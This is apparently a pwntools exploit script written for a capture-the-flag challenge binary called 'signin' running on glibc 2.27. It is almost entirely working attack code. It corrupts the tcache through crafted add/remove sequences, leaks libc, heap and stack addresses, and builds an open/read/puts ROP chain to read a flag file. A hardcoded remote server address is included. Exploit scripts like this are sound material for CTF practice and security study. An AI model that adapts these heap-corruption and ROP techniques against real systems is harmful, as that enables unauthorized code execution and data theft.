#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'signin'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "47.242.161.199"
server_port = 9990

# if local debug
LOCAL = 1
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def ad(i, n):
	sla('>>', '1')
	sla(':', str(i))
	sla(':', str(n))

def rm(i):
	sla('>>', '2')
	sla(':', str(i))

def dp(i):
	sla('>>', '3')
	sla(':', str(i))


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	for i in range(258):
		#li('ad: ' + str(i))
		ad(1, i)

	for i in range(258):
		#li('rm: ' + str(i))
		rm(1)

	for i in range(int((0xef0 - 0x6e0) / 8) - 1):
		#li('rm: ' + str(i))
		rm(1)

	dp(1)
	leak = int(ru('\n'))
	libc_base = 0
	li('leak: ' + hex(leak))

	libc_base = leak -  0x3ebc40 - 96
	#libc_base = leak -  0x3afc40 - 96

	li('libc_base: ' + hex(libc_base))

	t = 0x20 + 0x30 + 0x50 + 0x90 + 0x110 + 0x210 + 0x410
	for i in range(int(t / 8)):
		#li('rm: ' + str(i))
		rm(1)

	#rm(1)
	dp(1)
	leak = int(ru('\n'))
	li('leak: ' + hex(leak))
	heap_base = leak - (0x55a7e41cee70 - 0x55a7e41bd000)
	li('heap_base: ' + hex(heap_base))
	t = 72721 + 593
	for i in range(int(t / 8) - 4):
		#li('rm: ' + str(i))
		rm(1)

	environ = libc_base + libc.sym['environ']
	
	li('environ: ' + hex(environ))
	ad(1, environ + 8)

	ad(2, 0)
	ad(2, 0)
	ad(2, 0)

	rm(2)
	rm(2)
	rm(2)
	dp(2)

	stack = int(ru('\n'))
	li('stack: ' + hex(stack))
	stack_ret = stack - (0x7ffc90831238 - 0x7ffc90831128)
	
	li('stack ret: ' + hex(stack_ret))

	# passby free size check
	# recovery as normal
	rm(2)
	rm(2)
	ad(2, 0x31)
	ad(2, 0x31)


	# modify tcache struct 
	ad(1, 0)
	# 0x41
	p_a = heap_base + (0x556b504f0ee0 -  0x556b504df000)
	li('heap_0x41: ' + hex(p_a))
	ad(1, p_a)

	for i in range(3):
		ad(1, 0)
	
	p_a =  heap_base + (0x55f0423c1f30 -  0x55f0423b0000)
	li('heap_0x71: ' + hex(p_a))
	ad(1, p_a)

	for i in range(6):
		ad(1, 0)
	flag = './flag\x00'
	flag = flag.ljust(8, '\x00')
	flag_addr  = heap_base + 0xc0
	ad(1, u64(flag)) # heap_base  + 0xc0

	ad(1, stack_ret)

	libc_read = libc_base + libc.sym['read']
	libc_open = libc_base + libc.sym['open']
	libc_puts = libc_base + libc.sym['puts']

	pop_rdi = libc_base + 0x2155f
	pop_rsi = libc_base + 0x23e8a
	pop_rdx = libc_base + 0x1b96
	pop_rdx_rsi = libc_base + 0x130889

#	# ret to here
#	# open
	ad(2, pop_rdi)
	ad(2, flag_addr)
	ad(2, pop_rdx_rsi)
	ad(2, 0)
	ad(2, 0)
	ad(2, libc_open)

	# read
	ad(2, pop_rdi)
	ad(2, 3)
	ad(2, pop_rsi)
	ad(2, flag_addr + 0x100)
	ad(2, pop_rdx)
	ad(2, 0x100)
	ad(2, libc_read)

	# puts
	ad(2, pop_rdi)
	ad(2, flag_addr + 0x100)
	ad(2, libc_puts)
	#db()

	db()
	# trigger
	ad(2, 0)

'''
.text:0000000000001032                 leave
.text:0000000000001033                 retn
'''

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
